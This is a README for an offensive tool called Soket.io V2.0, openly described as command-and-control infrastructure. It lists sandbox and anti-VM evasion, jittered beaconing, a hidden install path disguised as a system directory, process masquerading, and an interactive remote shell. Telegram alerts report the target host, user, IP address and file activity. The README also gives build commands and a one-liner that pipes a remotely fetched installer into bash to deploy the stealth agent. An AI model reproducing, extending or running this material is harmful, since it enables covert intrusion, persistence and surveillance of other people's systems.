# SOKET.IO V2.0 | Supreme Standardized Infrastructure

[![License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Security](https://img.shields.io/badge/Security-BearSSL-cyan.svg)](https://bearssl.org/)
[![Arch](https://img.shields.io/badge/Arch-Multi--Arch-green.svg)](#supported-architectures)
[![Status](https://img.shields.io/badge/Status-V2.0--Supreme-red.svg)](#deployment)

**Soket.io V2.0** is the ultimate upgrade to our professional C2 infrastructure. Engineered for absolute resilience and supreme evasion, V2.0 introduces kernel-level Anti-VM detection, jittered communication patterns, and full interactive PTY support.

---

## V2.0 Supreme Upgrades

### 1. Advanced Evasion (Stealth & Persistence)
- **Anti-VM & Anti-Analysis**: Integrated CPUID hypervisor detection and VM artifact scanning (VMware, VirtualBox, KVM, etc.).
- **Stalling Logic**: Random initial delays and "human-like" sleep patterns to bypass automated sandbox analysis.
- **Jitter Heartbeat**: Randomized heartbeat intervals (25s - 45s) to defeat traffic pattern analysis and anomaly detection.
- **Pre-Auth (PSK)**: Mandatory TCP-level Pre-Shared Key verification before TLS handshake to protect the Relay from Shodan/Nmap scans.

### 2. Operational Mastery (UX Operator)
- **Full Interactive PTY Shell**: Support for interactive terminal sessions, allowing the use of `sudo`, `nano`, and other terminal-intensive tools.
- **Telegram God-View 2.0**: Enhanced alerts with inline keyboard buttons for instant **File Pull (Download)** and **Session Termination**.
- **WebSocket Fallback**: Automated fallback to WebSocket over TLS for bypassing strict L7 firewalls that inspect raw TLS.

### 3. Infrastructure Resilience
- **Build Verification**: Automated static build auditing to ensure 100% stand-alone binaries with zero shared library dependencies.
- **Dependency Guard**: Installer (`install.sh`) now performs rigorous environment checks before deployment.

---

## Technical Specifications

| Feature | Specification |
| :--- | :--- |
| **Encryption** | TLS 1.3 (BearSSL) + XChaCha20-Poly1305 (Monocypher) |
| **Authentication** | Ed25519 (Identity) + TCP PSK (Pre-Auth) |
| **Evasion** | Anti-VM, CPUID, Jitter, Process Masquerading |
| **Binary Linkage** | 100% Static Musl-Libc |
| **Payload Size** | ~110KB (Uncompressed) |
| **Stealth Path** | `/usr/lib/x86_64-linux-gnu/perl5/.system-runtime-cache/` |
| **Architecture** | x86_64, aarch64, armhf, i386 |

---

## Installation & Deployment

### 1. Build Environment (WSL/Linux)
Ensure you have `musl-gcc` and `go` 1.22+ installed.

```bash
# Build Client Agent
cd client && make clean && make prod

# Build Relay Server
cd relay && CGO_ENABLED=0 go build -ldflags="-s -w" -o bin/phantom-relay cmd/relay/main.go
```

### 2. Deployment (One-Liner)
The agent is deployed via a standardized installer that enforces stealth paths and symbolic aliases.

```bash
bash -c "$(curl -fsSL https://raw.githubusercontent.com/Oyen-Sec/soket/main/deploy/install.sh)"
```

---

## Operational Commands

Once deployed, the agent can be managed using simplified aliases:

- **Agent Alias**: `gs-oyen-s` (Standardized agent binary)
- **Relay Alias**: `gs-oyen-r` (Quick relay access)

### Example Usage:
```bash
# Start Relay with custom listener
gs-oyen-r -listen 0.0.0.0:443

# Manual Agent execution
gs-oyen-s -s "SECRET_KEY" -i "RELAY_IP" -m 443
```

---

## Telegram Intelligence God-View
V1.0 introduces professional alerts for critical system events:
1. **Successful Installation**
2. **File Deletion**
3. **File Editing (Modification)**
4. **File Renaming/Moving**

Every alert includes target hostname, user context, IP address, and precise file paths.

---

&copy; 2026 Oyen-Sec Infrastructure. Engineered for absolute resilience.
